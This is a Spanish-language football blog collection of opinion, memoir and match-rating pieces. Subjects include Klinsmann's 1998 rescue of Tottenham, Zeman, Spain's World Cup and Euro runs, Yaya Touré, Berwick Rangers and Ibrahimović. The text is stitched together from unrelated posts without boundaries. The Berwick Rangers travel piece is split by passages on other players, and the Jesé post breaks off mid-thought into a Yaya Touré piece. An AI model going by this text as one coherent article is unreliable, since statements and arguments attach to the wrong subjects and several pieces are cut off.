97-98. Más de una decada después, aquellos Ginola, Ferdinand y compañia que vistieron la susodicha camiseta se dedican apasionadamente al cultivo del bandullo y Alan Sugar, el magnate informático que dirigía por entonces el club ni siquiera es presidente de su propia compañía (Amstrad) y se dedica a divertir al mundo con breves apariciones en realities de diverso pelaje y predicciones descacharrantes como aquella de que el Ipod iba a ser un fracaso. Todo ha cambiado e incluso la actualidad que envuelve al club del barrio  de Haringey dista mucho de parecerse a la de 1997. Los lirios, lamentables durante la mayor parte de aquella temporada, peleaban por un objetivo humilde: evitar el descenso a segunda. Fue entonces cuando Sugar decidió mirar por el negocio y rascarse el bolsillo en el mercado invernal. Lo extraño fue que se la jugara con una vieja gloria del club, con un tipo con tanta fama de buen futbolista entre los ingleses como de piscinero, con uno que a sus 33 había pasado los últimos meses lamiéndose las heridas de una pegajosa lesión de ligamentos. Aquel hombre era Jürgen  Klinsmann.El espigado y blondo alemán, al que un día diera calabazas Jesús Gil por miedo a que le soliviantara sexualmente el vestuario, estaba prácticamente desahuciado y nadie hubiera apostado una libre a que estaba volviendo a  Londres para obrar el milagro, por más que hubiera deslumbrado en su anterior etapa en la entidad. Sin embargo Klinsmann anotó nueve goles en quince partidos durante los seis meses en los que ejerción de jefe de la delantera spur. Nueve goles como nueve globos que  consiguieron elevar al equipo, en el último   suspiro y  cuando su culo  ya empezaba a quemarse en las llamas del   descenso. Recordados son sus cuatro tantos   contra el Wimbledon en un   encuentro vital para la supervivencia. El nueve estuvo a las muy duras y no se   arrugó en los partidos clave para dejar al Tottenham en primera aunque fuese tan sólo por un miserable margen  de cuatro puntos. Tras esta resurrección  futbolística, increible pero cierta, Jürgen Klinsmann    se retiró del fútbol de  clubes al más alto nivel. Eso sí, con los deberes hechos. Ni visitas al campo con mi abuelo ni hostias. Aparte de un póster hipnotizante del Oviedo en el bar Chicote, una de mis primeras memorias futbolísticas es charrúa. Me tiene grabando el España-Uruguay del Mundial 90 en un VHS que mi padre había comprado a un gitano del rastro. Aquella venta chapucera cumplió las expectativas; el registro de aquel partido hubo que enterrarlo, poco a poco, con horas de emisión musical de la Viva o el canal de turno. Que la selección empatara a nada era cosa muy normal; lo que recuerdo con claridad es el asombro por el penalti que Rubén Sosa tiró a las nubes ¿Cómo era posible que semejante titán, que además era extranjero, fallase un tiro tan sencillo? ¡Y ante Zubi! Para entender el pasmo diré que tenía diez años y que entonces la prensa no ninguneaba por sistema a cada rival que jugara contra un equipo español. Muchísmo tiempo después, en la universidad, mi buen amigo Juan, zaragocista y culé hasta la médula, me habló mucho y bien de Sosa. ¡Qué bien lo hacía el principito con el sprint y aquella zurda de plomo! . Pero para entonces ya lo sabía, era uno de esos jugadores que ya no importan. Zdenek Zeman. Tras la inverosímil remontada del Milan en Lecce me apetece hablar del tipo. Y así de paso continúo perpetuando la sempiterna manía por acordarme de las cosas…Goles a chorro en el Via del Mare y los engranajes mecánicos de mi cabeza girando a toda velocidad. Ahí dentro una bombilla resplandeciente con dos palabras entre sus filamentos, Zdenek Zeman. ¡Ma quale idea! . Zemanlandia. Aquel Lecce del 4-3-3, el que jugaba y goleaba como los dioses y palmaba como el último de los terroni. Muy Zeman, aquel Lecce fue el último legado futbolístico hasta la fecha del bohemio del calcio.El checo siempre ha sido un personaje. Flacucho y fumador empedernido como Cruyff y eterno nómada del banquillo italiano más infrafutbolero, siempre le ha acompañado un aura de genio rebelde. Genio por defender el juego alegre en la patria chica de la racanería. Rebelde por posicionarse sin tapujos a favor de un deporte limpio, sin coruptos ni dopaje. Unas declaraciones suyas llevaron a la Juventus a los tribunales. Zeman perdió claro, nadie esperaba un resultado distinto, pero ahí queda su gesto.Luego está su legado, el célebre e inamovible 4-3-3. Tres números hacia la felicidad. Jugando así logró que a alguno de sus equipos le colgasen adjetivos como efervescente o fútbol champagne. Todo sin un duro en la caja. Lo de Zeman era la zona, el pressing, la permuta continua de posiciones. También el buen gusto para rastrear el mercado. Bojinov, Beppe Signori, Rambaudi, Petrescu y Shalimov. Aquel Foggia rozó el boleto UEFA y perdió. De hecho Zeman casi siempre pierde por más que  a la larga el fútbol acabe ganando.Ayer el Lecce ganaba 3-0 al Milan pero acabó perdiendo 3-4. Zemanlandia. Manuel Pellegrini: “Tuvimos dos o tres ocasiones claras para empatar. Si jugamos como en la segunda mitad, podemos tener opciones”. Cuando escucho los análisis del chileno en rueda de prensa pienso que sería un digno competidor de Eugenio. Eugenio el humorista.La tele en mi cuarto ocultó mis celebraciones. El fútbol sobrevivía en el hogar en la pequeña reserva de mi dormitorio. Después me fui de casa y sólo dejé allí un póster de Raúl doblado en alguna parte, una banderola del West Ham que alguien me trajo de Londres y un balón desinflado con el que jugueteaba con los pies mientras estudiaba en el escritorio. Ayer, cuando ganamos, mientras brindaba con los amigos y nos abrazábamos como insensatos, me dio por coger el teléfono y llamarlo. Había visto el partido con mi hermana, me dijo. Noté en su voz una emoción inédita. Afonía. Me costaba imaginarlo gritando a los árbitros. Levantándose del viejo sofá con los brazos en alto tras el gol de Puyol. Sentado frente al reflejo esmeralda de la televisión. Con la cerveza y las pipas. El ritual doméstico de los hinchas. Aquel que nunca compartimos. Con el corazón temblando ante el ataque de los alemanes. Lo imagino echándome de menos allí. Sin poder preguntarme por Klose, sin saber quien era ese tal Schsweinsteiger. Sin saber si el cambio de Pedro por Torres era bueno o malo. Lo veo navegar por mares comunes. Con planteamientos sencillos. Infantilmente nervioso ante un espectáculo que le fue ajeno mientras compartíamos espacio pero que hoy disfruta, precisamente, sin tenerme a su lado. Me preguntó si estaba feliz. Apenas pude contestarle. Y no era sólo el fútbol. No era el cuero, ni el césped, ni los músculos cansados. Era descubrir que este estúpido deporte tiende puentes, que es una suerte de reencuentros. Que detrás del espectáculo hay una telaraña de sentimientos, de recuerdos comunes, de vidas en paralelo. Ayer, tras la victoria, pensé en mi padre. Él pensó en mí. Nos volvimos a juntar en alguna parte, en el espacio tierno de los afectos. Nos echamos de menos mientras los alemanes lloraban y los españoles se abrazaban sobre el césped. Le dije que le quería. Él me dijo que saliera a la calle a celebrarlo. Tengo viejas revistas de música apiladas en el cuarto de baño. De vez en cuando las leo. Hurgo entre el montón y cojo una al azar. Son tan viejas que las leo por echar una risa. El otro día leí una que decía que The Horrors serían los nuevo The Cure. En otra que The Strokes cambiarían la música para siempre. Hay alguna donde hablan de Pereza como la gran esperanza del rock en español y, entre carcajadas, leí un titular que decía `Jamelia ha llegado para quedarse`. The Next Big Thing que traduzco libremente como Pegar el Pelotazo. Con el fútbol pasa lo mismo. Estamos obsesionados con señalar con el dedo quien será el siguiente, como hipsters en la cola de la Nasti –¿sigue abierta? -. Recuerdo a Nasri como “el nuevo Zidane”, recuerdo a Gai Assulin como “el nuevo Messi”, recuerdo a Portillo como “el nuevo Raúl”. En el mejor de las cosas, pasaron de Next Big Thing a One Hit Wonder. Como Lilly Allen, Kaiser Chiefs, Black Crowes, The Drums, Manos de Topo o Elbow.Cuando veo los elogios a Jesé pienso en música. Su disco suena bien. Suena mejor que muchos de los discos que sus compañeros llevan años sacando. Sus canciones suenan mejor que las de Di María, menos monótonas, más bailables, no da la sensación de que hay temas de relleno. Suena mejor que Morata, aunque compartan sello.Pero tal vez el futbolista africano estaba llamado a desempeñar empresas mayores. Puede que, al fin y al cabo, el Barça se le quedase pequeño en cierto modo. Uno tiende a creer que vistiendo de azulgrana jamás habría podido alcanzar la cuota de protagonismo de la que disfruta como jugador del City. Que a la sombra eterna de Xavi, Iniesta, Fàbregas y, sobre todo, Busquets, Yaya nunca se habría destapado como el futbolista total en el que ha terminado convirtiéndose. Que el fulgor de las estrellas habría eclipsado su carrera. ‘Cuando estaba en el Barça yo era un jugador para tener la posesión del balón y organizar. En el City me siento más cómodo, tengo libertad y puedo hacer lo que quiera’, declaraba días atrás el marfileño a Champions Magazine. El asunto es que lo que quiere hacer Yaya Touré, y lo que habitualmente hace, es mucho y muy bueno para su equipo. No juega, como quizá habría terminado haciéndolo en el Barça, con un limitador en su caudalímetro para regular su descomunal potencia. Si puede llegar al área rival, lo va a hacer. Si puede ejercer como goleador llegando desde atrás, también. Si tiene oportunidad de lanzar una falta directa, nadie mejor en toda la Premier League que él. ¿Habría alcanzado ese nivel actual de haber seguido bajo la disciplina, nunca mejor dicho, azulgrana? Puede que él añore su etapa en Barcelona, el sol, el calor del público, el espíritu del juego barcelonista… Sin embargo, su carrera como futbolista ha terminado agradeciendo aquella decisión arriesgada de dejar el Camp Nou en el verano de 2010. Por mucho que la nostalgia llame a su puerta cada vez que alguien menciona en su presencia la palabra ‘Barça‘. El viaje en el tren de East Coast desde King’s Cross hasta Edimburgo transcurre lento y pastoso. El tiempo, aunque el tren sí lo haga, parece no avanzar mientras por la ventanilla se dibuja un paisaje de eternas praderas salpicadas de pintorescas granjas que se difuminan por efecto de la velocidad. Solo el paso por ciudades de cierto calibre, como Peterborough, Doncaster o York rompe con la monotonía visual y sonora del recorrido hasta las tierras del norte. Hay que dejar atrás la populosa Newcastle, mientras uno intenta atisbar a lo lejos como puede alguna referencia que le remita a St. James’ Park, para que el panorama al otro lado de los cristales cambie radicalmente. Acercarse al Border entre Inglaterra y Escocia te obliga a dejar la lectura, la bolsa de chips Walkers y todo aquello que te trajeras entre manos para tratar de hacerte el viaje más ameno y llevadero. Porque, a medida que la densidad de población de ganado ovino va incrementando, el paisaje te atrapa. El tren se acerca al Mar del Norte y comienza a bordear la costa, ofreciendo la sensación de que todo lo que está por llegar un poco más al norte es algo completamente novedoso. Berwick-upon-Tweed es el último pueblo antes de entrar en tierras escocesas… o el primero al penetrar en ellas.Atravesada por la frontera natural histórica que dibuja el estuario del río Tweed, río considerado geográficamente escocés que parte físicamente el casco urbano de la localidad en dos mitades, una inglesa y otra escocesa, la pintoresca Berwick ha sido siempre una población dividida. Entre los años 1296 y 1482, épocas turbulentas, el estratégico asentamiento geográfico de la ciudad propició una alternancia de poder.Todo es una leyenda alrededor de ese equipo: que cambiaban jugadores en los descansos aprovechando el parecido físico, que tuvieron que dormir en un convento católico porque estaban tan seguros de perder que no habían reservado hotel tras la primera parte… seguramente mitos cuya existencia hace justicia a la impronta que dejó aquel equipo. Por eso nos alegramos de la dignidad con la que se han batido hoy. Vaga por la media luna mientras el equipo contrario intenta trabajosamente sacar el balón. De repente observa el corte de su compañero, y se activa como una araña que sienta el tintineo en la red. Un segundo después ya le han servido el manjar, mira a los ojos de Viviano y lo fusila con la zurda. Pasa un rato, tranquilo, quizá piensa qué cenó anoche o dónde andará ahora Helena. Hasta que ve que su equipo ha robado el balón en defensa e inicia un contragolpe prometedor. Qué pereza, pero bueno, no hay nadie delante, así que una carrerita, diez trancos de los míos y ya estoy otra vez en el área. De nuevo me regalan el balón. Uf, no me apetece pegarle ahora, apunto un poco y chuto con displicencia, sin mala leche. Total, como sé que va entrar… Igual que el tercero, pero aquí, como sé que me van a firmar el balón, me espero y apunto al poste lejano. Lo siento, Emiliano, no fue nada personal, es sólo que cuando quiero soy el mejor jugador del mundo, y últimamente lo quiero de vez en cuando. Brazos abiertos, berrido y a casa. Adiós, Palermo.Nos gustaría decir que Ibrahimovic ha madurado, pero la realidad no es esa. Da la impresión de que es el mismo futbolista y la misma persona que salió un día de un suburbio de Malmoe dispuesto a comerse el mundo y hacerse notar. Sobre lo primero, está firmando una temporada maravillosa, a la altura de los mejores, convertido en la referencia de un Milan que trata de reverdecer viejos laureles. Allegri sabe que con el sueco posee artillería pesada, pero al igual que le ocurrió a Mourinho en el Inter, se ha dado cuenta de que sólo puede utilizarla con la condición inexcusable de desarrollar una forma de jugar a la medida de Zlatan. El método ya ha brindado Ligas, pero queda la duda de si tanta clase concentrada en un solo hombre es suficiente para asaltar la cumbre máxima del trono europeo. No parece probable, aunque está claro que Ibra sueña con la orejona –nunca la ha ganado- y que con ella entre ceja y ceja puede brindar actuaciones como la de la ida ante el Arsenal, candidata al highlight del año. Nada que no hubiera hecho antes.Sobre el no haber cambiado, da fe la sanción que ha cumplido hace poco por la bofetada a Salvatore Aronica. Está claro que cuando está a disgusto las posibilidades de que la monte aumentan exponencialmente, pero episodios como el mencionado hacen pensar que en esa cabeza hay uno o varios cables sueltos, y que en ocasiones el cortocircuito se produce sin motivo aparente. La pena es doble, en cualquier caso: por una parte, que la imagen que muchos aficionados tengan de él –y muy especialmente en relación con el Barcelona- sea la de un payaso; y por otro, que siempre se queda uno pensando lo que hubiera podido ser ese futbolista si Dios le hubiera dado a nivel emocional la décima parte de lo que le regaló en el plano técnico. Con treinta tacos, talludito y ahora barbudo, ya nadie espera que cambie, así que habrá que conformarse con disfrutarlo como es. Que visto lo visto esta temporada, es una barbaridad. “Quizá la mayor facultad que posee nuestra mente sea la capacidad de sobrellevar el dolor. El pensamiento clásico nos enseña las cuatro puertas de la mente, por las que cada uno pasa según sus necesidades“. Patrick Rothfuss Pasan por la Puerta del Sueño todos los acontecimientos cuya imposibilidad metafísica define al fútbol como onirismo colectivo. No puede ser que un futbolista controle un balón, dé una vuelta de vals en otra dirección y, milagrosamente, se encuentre la bola un año después para ajusticiar a un portero. Ni que el gol que todos hemos ejecutado alguna vez en un sueño, controlando en tu campo a la que no mancha y regateando a un ejército antes de empujar a puerta vacía, lo repitieran idéntico dos tipos a los que une un hilo de plata en tiempos y lugares diferentes. Y mucho menos lo que siempre llevamos en el fondo del corazón, y que repetimos una y otra vez en ese espejo de fantasía que son los videojuegos: tomar el equipo de tu barrio, de tu pueblo o de tu pequeña ciudad, y en un parpadeo hacerlo campeón de Europa. No puede ser. Y si ese tipo seductor se llama Sueño, Morfeo, Oneiros o Sandman, igual podemos conocerlo por Dennis, Armando, Leo o Brian. Qué sabemos nosotros.Hasta aquí lo que se refiere a esos hermosos momentos en que sonreímos con los ojos cerrados y despertamos felices, dispuestos a exprimir el nuevo día o el nuevo lunes. Pero hay momentos terribles en los que todo parece ir al revés, las grietas resquebrajan las promesas de alegría, y percibimos entre la desazón y la angustia el mar negro e infinito que se anuncia detrás. Pongamos que nuestro club va por delante en el descuento de la final de la Copa de Europa, y la pierde en un minuto. O que morimos por ese equipo que es pequeño pero orgulloso, que se enfrenta al titán en la final, va perdiendo y consigue empatar, y vuelve a ir perdiendo y vuelve hacerlo, marca un gol, dos, tres, cuatro, se queda con diez y aguanta, se queda con nueve y sigue resistiendo, y que, con Ítaca ya a la vista, acaba condenado por un gol en propia puerta de su gran capitán. Cuando el dolor es excesivo, corren las lágrimas y el simple recuerdo regala un martillazo, no hay más solución que cruzar la Puerta del Olvido. Aunque parezca tan lejana que lleguemos a creer que no existe, en algún lugar nos espera para aliviarnos. ¿Dónde está Alesia?Luego llegan los estados superiores. Si estos sueños o pesadillas siempre nos contemplan como espectador, más o menos implicado, muchas veces demasiado, momentos puntuales nos lanzan al paroxismo. Los minutos más intensos de la vida, los que sentimos con el cerebro, el corazón y el hígado, el borde de las pestañas y las puntas de los pies. Segundos en los que estamos viviendo tanto, sintiendo tanto, celebrando tanto, que el marciano que llegase del exterior saldría despavorido advirtiendo a sus compañeros de la irracionalidad y los sonidos desgarradores capaces de proferir los extraños bichos que habitan en este pequeño planeta. Nadie recuerda nada al cruzar la Puerta de la Locura, esa que por ejemplo reventó el disparo de un pequeño vampiro, y cerró suavemente un santo de barba venerable levantando al cielo seis kilos de gloria dorada. ¿Alguien podría describir qué ocurrió en esos minutos que definen la mente en blanco?Pero todo acaba. Lo bueno, lo malo, lo alegre y lo duro, felicidad, gravedad y desesperación. La multitud marchándose tras el partidazo, esa tristeza infinita de las gradas sin nadie de la que hablaba Galeano. Nada puede sustituir al fútbol, Kevin, cuando toca la campana de la retirada, y las piernas niegan lo que en la cabeza han dibujado el talento y la experiencia. Un ruido sordo a derribo que nos llega de los fantasmas de Highbury, Sarriá o el auténtico Wembley, catedral desaparecida. El rumor de los que defendieron camisetas que ya no existen, clubes enteros perdidos en el océano de la codicia, la ineptitud o el tiempo. Y sobre todo, por encima de todo y de nosotros, la leyenda de los que nos dejaron: las flores en la Plaza de los Héroes recordando a Pancho, las multitudes despidiendo en Belfast a George Best mientras sentían en su interior mutar la admiración en añoranza; y la otra cara, Juanito en una carretera anónima, Escobar viendo un cañón, o Sindelar Dios sabe cómo. Aunque se fueron, siempre estarán aquí. ¿Por qué entonces, siendo inmortales, tuvisteis que cruzar la Puerta de la Muerte? El fútbol es eterno. Si el gol de Drogba al Arsenal fue la monda, éste de Burrows en el descuento es el saco de patatas completo. Por cierto, ¿alguien lo vería en directo aparte de los que pisaban verde y los tres que dan botes en primer plano?En poco menos de doscientos años, Berwick cambió de manos hasta en trece ocasiones y aún a día de hoy, aunque es oficialmente considerada como inglesa desde hace más de cinco siglos, mantiene a su población con el sentimiento indeciso.Menos indecisión pareció existir en lo que al club de fútbol de la ciudad se refiere. Fundado en el año 1884, el Berwick Rangers FC apenas tardó once años desde su nacimiento en adherirse a la federación escocesa. Admitido en 1905 en el sistema de competición escocés, jamás se ha puesto en tela de juicio la conveniencia de reconsiderar la decisión y reincoporarse, más de un siglo después, al subsuelo de la pirámide que estructura la competición en el fútbol inglés. El caso de Berwick choca radicalmente con el de Gretna, población situada sobre suelo escocés y que estuvo participando en competición inglesa hasta principios de la pasada década. En 2002, el club fue admitido en la Scottish Football League, consiguió ascender en una trayectoria mágica hasta la Scottish Premier League, y posteriormente cayó en bancarrota y desapareció.Sin embargo, y pese a la teórica menor competitividad del fútbol escocés, el Berwick Rangers nunca ha conseguido afianzar un proyecto sólido. A lo largo del siglo XX ha tenido que hacer frente a dos o tres situaciones límite en el plano económico y financiero (la última, a mediados de la década de los noventa) que a punto estuvieron de llevar al club a su definitiva desaparición. Sin grandes logros en su palmarés, quizá su mayor éxito fuese la eliminación del poderoso Rangers (1-0), campeón de la anterior edición, en eliminatoria copera en el año 1967. Por vez primera en su historia, el club de Ibrox era eliminado en una ronda de copa por un equipo de inferior categoría. ‘Nunca en la historia del fútbol escocés ha habido un resultado comparable al de este partido y dado que el Rangers es el Rangers, traerá inevitablemente serias consecuencias y repercusiones‘, se desahogaba Glyn Edwards en las páginas del Glasgow Herald dos días después de la infame derrota en suelo inglés. Y así ocurrió. La derrota en el Sheilfield de Berwick trajo consigo la salida inmediata de varios integrantes de la plantilla del Rangers y la contratación de varios refuerzos que llevaron al equipo hasta la final de la Recopa de Europa… un triste consuelo en el año en el que el Celtic de Jock Stein consiguió alzar los cuatro títulos que disputaba (Liga, Copa, Copa de la Liga y Copa de Europa). Viejas hazañas aparte, la realidad actual del Berwick Rangers nos presenta a un modestísimo club que, si bien saneado en lo económico, sufre lo indecible para mantener el tipo en la Scottish League Two, la cuarta categoría del fútbol escocés. El barrizal de Shielfield apenas acoge a un par de miles de espectadores por partido y nada hace vislumbrar en el horizonte que la cosa vaya a mejorar a corto o medio plazo. Y asi, ensimismado en el recuerdo de un equipo con sangre escocesa (casi la totalidad de su plantilla procede de la zona norte de la frontera) y alma inglesa, el tren se adentra en Edimburgo y detiene su marcha en el andén número 8 de la cavernosa estación de Waverley. Sin medias tintas, el acento por fin se endurece en el corazón de Princes Street. Donde ya uno no puede dudar de que por fin está pisando suelo escocés.Puedes comprar camisetas del Berwick Rangers, y de la práctica totalidad de los equipos de las ligas escocesas, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Con los meritorios sumando puntos de cara al torneo europeo del próximo verano, España sumó en Kiev (0-1) los tres últimos puntos de una fase de clasificación que se cierra mucho mejor de lo que se abrió. Porque la España que, en un partido alocado y convertido en un continuo ir y venir entre áreas, consiguió salir airosa del que a priori había sido calificado como el partido más complejo de su grupo clasificatorio consiguió minimizar hasta dejar en irrelevantes los efectos de aquella sonada y dolorosa derrota de Žilina (2-1), hace exactamente un año. Tras aquel toque de atención en suelo eslovaco, la selección nacional no volvió a dejar escapar un solo punto en los ocho siguientes encuentros y no permitió un solo gol en su portería. Sin brillar, pero es que tampoco había necesidad de ello. Por llegar a Francia con las dudas despejadas y las aguas calmadas.El gran peligro de estas fases de clasificación para los grandes torneos de selecciones es precisamente que suelen resultar intrascendentes por asequibles. Y en la intrascendencia, en la ausencia de motivos futbolísticos y de debates en torno al balón, surgen dañinas cuestiones paralelas. Porque de algo hay que hablar. De la nula adaptación al equipo de Diego Costa, del trato a Gerard Piqué en los partidos de España como local o incluso de un debate, el de la portería, que gira en torno a un nombre propio y que, me temo, no se silenciará hasta que Iker Casillas anuncie su retirada. Rivales de escaso nivel competitivo y poquito cartel, partidos considerados como meros trámites en mitad de calendarios recargados y a los que los futbolistas más habituales en el combinado nacional parecen tener alergia. Nada que no conociésemos ya. Los mismos indicadores de siempre. Las fases de clasificación siguen siendo torneos en los que lo único que se exige es no fallar, rendir funcionarialmente, cumplir con el guión sin salirse ni una línea y minimizar todos los males que puedan surgir por el camino. Precisamente, todo lo que, una vez más, ha sabido hacer España. Los casi dos mil kilómetros que separan San Sebastián y Berlín por carretera se quedan en nada si uno echa la vista cinco meses atrás y mide la distancia, sideral, que separa al nuevo campeón de Europa de aquel equipo repleto de miedos y tensiones que cayese en Anoeta allá por el mes de enero. Aquella noche el Barça de Luis Enrique tocó fondo. El asturiano comprobó, con toda crudeza y sin posibilidad de paliativos, la voracidad de un entorno, el barcelonista, con preocupante tendencia a la autodestrucción. El tsunami desatado en la costa donostiarra se llevó por delante a Zubi, gran valedor de Lucho e importante apoyo en los primeros pasos del nuevo técnico azulgrana, y dejó una seria advertencia al hombre encargado de reeditar el Barça triunfal tras el torpe año de Martino: el Barça era de sus futbolistas.Porque solo unos futbolistas tan únicos y geniales como Messi, Neymar, Suárez, Rakitic o Iniesta serían capaces de reinterpretar el camino al triunfo para darle al FC Barcelona su quinta Copa de Europa desoyendo las directrices de juego dictadas hace un cuarto de siglo por Johan Cruyff. Porque resulta cuando menos impactante que el Barça se deshiciese de la Juventus abrazando un estilo eminentemente contraatacante, mecido por el vaivén del mejor Iniesta de la temporada. Ya no es un Barça de centrocampismo que se apoya en el virtuosismo de sus menudos ensambladores. Ya no es un Barça de cocción lenta y meditación profunda. Ahora transcurre veloz, provocando el vértigo entre unas líneas enemigas a las que antes doblegaba previa anestesia y ahora derriba a base de golpes demoledores, sin tanta sutileza. Rakitic, a diferencia de Xavi e Iniesta, no acuna, sacude. Es un Barça más terrenal. O, al menos, un Barça que se edifica en torno a un estilo más asequible. La diferencia con el resto de equipos no es tanto estilística, sino basada en la magnífica superioridad de aquellos que deben de plasmar el estilo cuando empieza a rodar la pelota. Nada iguala a día de hoy la compenetración, el rendimiento y la efectividad de la tripleta ofensiva azulgrana.Este Barça de Luis Enrique, más de entraña que de cerebro, ha completado la maravillosa tetralogía continental de la última década. La quinta de su historia, la cuarta en los últimos diez años. La que volvió a encaramar a Messi a lo más alto del fútbol mundial. La que fue justa con el trabajo del técnico y le hizo acreedor de una confianza que el barcelonismo parecía reticente a ofrecerle. La que ayudó a que la dolorosa despedida de Xavi fuese un poco más dulce. La que llegó para confirmar que la temida reconstrucción del equipo brillante y dominador es un hecho. Soy poco partidario de las moderneces. En general, me suelen gustar las cosas tal y como las he conocido y como las he ido asimilando a lo largo de los años. No es una cuestión de inmovilismo ni de anclaje en el pasado, es más un asunto de respeto por la tradición, de memoria y de saber muy bien de dónde se viene para poder entender hacia dónde se va. ‘Me gustaría que la selección tuviese un nombre, una identidad. Igual que Brasil es la Canarinha o Argentina es la Albiceleste, me gustaría que España fuese La Roja‘.Hoy es tan común que apenas nos llama la atención, pero en su momento fue una novedad divertida que dio la vuelta al mundo: la celebración de Bebeto de su gol simulando mecer a un niño, pronto seguido por Romario y Mazinho, y luego por los futbolistas papás de medio mundo. Fue un Brasil-Holanda de cuartos de final, tal y como el que nos espera hoy, que por cierto ojalá salga como el segundo tiempo de aquél. Un partidazo lleno de alternativas, con Romario y Bergkamp ejerciendo de genios, la remontada obligatoria y el cañonazo de Branco para acabar poniendo las cosas en su sitio. Fue el mejor Brasil del mundial 94, la única que vez que pareció realmente un equipo campeón y jugó como tal. Sobresaliente: Andrés Iniesta. Un poco en la sombra en el Barça del último año por los problemas físicos y la omnipresencia de Messi, en la Eurocopa ha emergido el mejor Andrés para lidera la Roja a su modo tan silencioso como firme. Ya destacó en el difícil encuentro contra Italia, y ayer volvió a mostrar que a día de hoy es el mejor argumento con el que cuenta la selección para revalidar el título. Vertical, incisivo e incontrolable para los irlandeses, Iniesta asumió el mando del equipo en el momento menos placentero del partido, cuando el resultado era aún corto y el juego español languidecía por momentos en un mar de horizontalidad. Con él y Silva se puede ir a cualquier sitio.Notable: Fernando Torres. El jugador más discutido de la reciente historia del fútbol español –ayer la noticia era su titularidad- aplazó los debates sobre su participación en la Roja del modo en que pueden y deben hacerlo los delanteros: con goles. Dos tantos marca de la casa, de los que en diferentes versiones llegaban con puntualidad británica tanto en los tiempos del Atlético como en los de Liverpool: un zapatazo automático, instintivo e imparable, que además abrió el marcador, y un carrerón poderoso culminado en una definición plena de suficiencia. Aún habrá que verlo frente a equipos más potentes y mejor organizados, pero de momento, y por fin, el Niño ha sumado méritos objetivos a la predilección que le ha mostrado Del Bosque incluso en los peores momentos. A día de hoy, el nueve es suyo.Aprobado: Andrea Pirlo. En realidad, bordeando el notable, o incluso más si hubiera mostrado más consistencia en la segunda parte. El metrónomo de Italia –con permiso de Albertini- no sólo dirigió a su equipo con la precisión habitual en el gran primer tiempo azzurro, sino que se dio el placer de clavar una de esas faltas que llevan admirándonos desde hace lustros. La gran tragedia de la selección transalpina son los 33 años del juventino, que pesan mucho según transcurren los partidos, y acaban adelgazando en exceso el centro del campo de una selección que depende de él mucho más de lo que debería. El cambio de Italia de una mitad a otra resultó llamativo, y le acabó dejando cerca de la condena.Suspenso: la zaga irlandesa. Verdad es que anoche España dominó de principio a fin y, en el segundo tiempo, practicó a ratos el mejor juego que se ha visto en esta Eurocopa, pero también lo es que se vio enfrente de la peor defensa del torneo. Los O’Shea-St. Ledger-Dunne-Ward no sólo se mostraron incapaces de detener el caudal ofensivo español, sino que mostraron unos problemas a la hora de sacar la pelota indignos de un equipo de nivel mediano. Dan fe de ello tanto el primer gol de Torres como las principales oportunidades españolas del primer tiempo, y funciona como estupenda alegoría la medio trivela de Silva, con un montón de camisetas verdes paralizadas de miedo delante de él. Trapattoni tiene mérito, pero también mucho trabajo. Por cortesía de Bar Deportes, un montaje de la BBC con todos los goles del Mundial. Que lo disfrutéis. Valdés. No demasiado exigido durante el partido, anduvo un poco blando en el primer gol del Madrid, aunque no es suya la mayor responsabilidad; en el de Ronaldo no tuvo ninguna culpa, y le sacó al portugués un testarazo al comienzo en estirada felina. En cualquier caso, no está cuajando su mejor año.Adriano. La opción de Guardiola para cubrir la baja de Abidal cumplió sin demasiados alardes. Pasó algunos problemas con Özil cuando el alemán cayó por su banda, y la presencia de un extremo puro como Tello en su carril le restó espacio para proyectarse como suele. Superado por Pepe en la jugada del primer gol.Puyol. Concentrado como suele, el gran capitán del Barcelona debió multiplicarse para defender los vertiginosos contragolpes del Madrid. Debió emparejarse con frecuencia con Cristiano, y el delantero madridista le superó más de lo habitual. Extrañamente irrelevante en el balón parado ofensivo.Mascherano. Como siempre solvente en su papel de corrector, cometió algún error al tirar la línea, y no leyó con facilidad el inteligente juego de Benzema por la zona izquierda de la zaga. Algo por debajo del sensacional nivel que ha mostrado durante todo el año, el Barça echó de menos una salida algo más limpia del balón.Dani Alves. Dispuesto como interior en una decisión controvertida de Pep Guardiola, es un futbolista que necesita espacio por delante para desequlibrar al rival. En estático sufre para escaparse de su par, y su contribución anoche apenas pasó de algunos pases interiores. De sus peores partidos con la camiseta del Barça, acabó desquiciado.Busquets. Importante como siempre en su contribución defensiva y a la hora de dar el primer pase en el medio, cortó una cantidad importante de posibles contragolpes en la zona central. La necesidad sobrevenida de jugar más arriba de lo habitual le hizo llegar tarde a algunos otros. Sin firmar su mejor actuación, fue quizá el mejor medio azulgrana anoche.Xavi. Juega lastrado desde hace tiempo por ciertos problemas físicos, y lo nota su juego, que a pesar de no ser explosivo requiere bastante resistencia. Apenas pesó en el medio, ni cuando comenzó más cerca del círculo central ni más adelante en el balcón del área. Casillas le sacó un tiro esquinado que pudo cambiar el curso de la contienda. Sustituido.Iniesta. Se suponía que la entrada de Tello debía suponer la liberación de Andrés en posiciones de interior, pero el albaceteño no resultó especialmente influyente, ni con sus míticas conducciones ni desde el pase.Al recordado Luis Aragonés, de quien no vamos ahora a descubrir méritos, no se le ocurrió mejor idea para empezar a escribir su cuaderno de bitácora al frente del combinado nacional de fútbol que sacarse de la manga un calificativo para el equipo. Un sobrenombre que, como a brasileños o argentinos, subrayara nuestra identidad nacional (o no). Algo que, al parecer y siempre bajo el criterio de Luis, no habíamos hecho de la manera debida en el pasado. De golpe y porrazo desaparecieron más de ochenta años de fútbol. Encerramos bajo siete llaves los recuerdos de Belauste y Sabino en Amberes, el poderío de la mejor cabeza de Europa después de Churchill, el cabezazo agónico de Marcelino a las redes de Yashin, el vuelo del Buitre en Querétaro, las proezas heroicas y todos los tropiezos, que, aunque cueste creerlo, contribuyeron más a la forja de una identidad firme y consolidada que los más grandes éxitos. Fue como si nada de lo vivido anteriormente hubiese valido. Como si de repente tuviéramos que avergonzarnos de haber sido, desde aquellas lejanas Olimpiadas de Amberes, ‘La Furia’. Demasiado vulgar y soez para los tiempos que corren. Vergüenza de nuestro pasado. Para llorar.El concepto de cambio radical, de punto de inflexión y de partida desde cero no estaba mal pensado por parte del difunto Aragonés y era, en cierto modo, necesario. Si se quería cambiar la historia, había que empezar a incitar ese cambio desde lo más básico, desde los mismos cimientos sobre los que se levantaba la idea del equipo nacional de fútbol. Pero la idea original de Luis, acertada y comprensible, se pervirtió y acabó maleada. El nombrecito cayó en gracia entre buena parte del público y, sobre todo, en la mayoría de los medios de comunicación. Lo de ‘La 